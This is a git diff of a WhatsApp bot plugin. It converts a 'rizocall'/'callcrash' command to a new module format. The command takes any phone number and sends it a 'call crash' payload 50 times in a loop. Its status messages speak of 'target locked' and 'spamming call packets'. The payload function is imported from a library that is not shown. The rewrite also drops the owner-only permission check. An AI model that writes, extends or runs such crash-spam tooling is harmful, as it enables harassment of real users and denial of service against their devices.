@@ -1,41 +1,34 @@
-let { sendRizoCallCrash, callSleep } = require('../lib/rizo-call');
+const { sendRizoCallCrash, callSleep } = require('../lib/rizo-call');
 
-let handler = async (m, { conn, args, command, isCreator }) => {
-    if (!isCreator) return m.reply('🔒 *Owner Only - Rizo Call Command!*');
-
+module.exports = {
+  name: "rizocall",
+  commands: ['rizocall', 'rzcall', 'callcrash'],
+  category: "owner",
+  description: "Trigger advanced call routing action",
+  async execute(sock, m, args) {
     if (!args[0]) {
-        return m.reply(`📌 *Usage:* .${command} 923xx`);
+      return sock.sendMessage(m.chat, { text: `📌 *Usage:* .rizocall 923xx` }, { quoted: m });
     }
 
     let pepec = (args[0] || "").replace(/[^0-9]/g, "");
-
-    if (!pepec) {
-        return m.reply('❌ *Invalid number format!*');
-    }
+    if (!pepec) return sock.sendMessage(m.chat, { text: '❌ *Invalid number format!*' }, { quoted: m });
 
     let protectedNumbers = ["923154734548"];
     if (protectedNumbers.includes(pepec)) {
-        return m.reply('🔒 *This number is protected!*');
+      return sock.sendMessage(m.chat, { text: '🔒 *This number is protected!*' }, { quoted: m });
     }
 
     let target = pepec + '@s.whatsapp.net';
-
-    await m.reply(`📞 *RIZO Call Target Locked:* ${pepec}\n⚡ *Spamming Call Packets...*`);
+    await sock.sendMessage(m.chat, { text: `📞 *RIZO Call Target Locked:* ${pepec}\n⚡ *Spamming Call Packets...*` }, { quoted: m });
 
     try {
-        for (let i = 0; i < 50; i++) {
-            await sendRizoCallCrash(conn, target);
-            await callSleep(1000);
-        }
-
-        await conn.sendMessage(m.chat, { react: { text: "📞", key: m.key } });
+      for (let i = 0; i < 50; i++) {
+        await sendRizoCallCrash(sock, target);
+        await callSleep(1000);
+      }
+      await sock.sendMessage(m.chat, { react: { text: "📞", key: m.key } });
     } catch (error) {
-        console.error(error);
-        m.reply("⚠️ Error: Call payload execute karne mein masla aaya hai.");
+      await sock.sendMessage(m.chat, { text: "⚠️ Error: Call payload execute karne mein masla aaya hai." }, { quoted: m });
     }
-}
-
-handler.command = ['rizocall', 'rzcall', 'callcrash'];
-handler.tags = ['owner', 'rizo'];
-handler.help = ['rizocall 923xx'];
-module.exports = handler;
+  }
+};
